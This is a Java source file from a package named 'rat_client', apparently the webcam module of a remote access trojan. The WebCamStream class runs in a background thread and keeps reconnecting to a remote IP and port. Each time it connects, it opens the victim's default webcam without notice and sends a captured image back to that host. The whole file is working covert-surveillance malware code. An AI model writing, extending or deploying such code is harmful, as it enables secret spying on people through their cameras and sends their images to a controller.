package rat_client;

import com.github.sarxos.webcam.Webcam;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import javax.imageio.ImageIO;

public class WebCamStream implements Runnable
{
    private String ip_address;
    private int port;
    private Socket socket;
    private ObjectOutputStream oos;
    
    public WebCamStream(String ip_address,int port)   //54325 is better
    {
        this.ip_address=ip_address;
        this.port=port;
        Thread thread=new Thread(this);
        thread.start();
        
    }

    private void createWebCamStream() throws IOException
    {
        ObjectInputStream ois=new ObjectInputStream(socket.getInputStream());
        ObjectOutputStream oos=new ObjectOutputStream(socket.getOutputStream());
        System.out.println("Received command...");
        Webcam webcam=Webcam.getDefault();
        try
        {
            webcam.open();
        }
        catch(NullPointerException exc)
        {
            System.out.println("No WebCam has been found!");
            oos.writeUTF("NoWebCamExcpetion");
            oos.flush();
            return;
        }
        BufferedImage image=webcam.getImage();
        oos=new ObjectOutputStream(socket.getOutputStream());
        try
        {
            oos.writeObject(image);
            oos.flush();
        }
        catch(IOException exc)
        {
            exc.printStackTrace();
        }
        socket.close();
        Thread thread=new Thread(this);       //implement server listener on exit
        thread.start();
    }
    
    @Override
    public void run()
    {
       while(true)
           try
           {
               socket=new Socket(ip_address,port);
               createWebCamStream();
               return;
           }
           catch(IOException exc)
           {
               
           }
    }
    
    
    
     
}
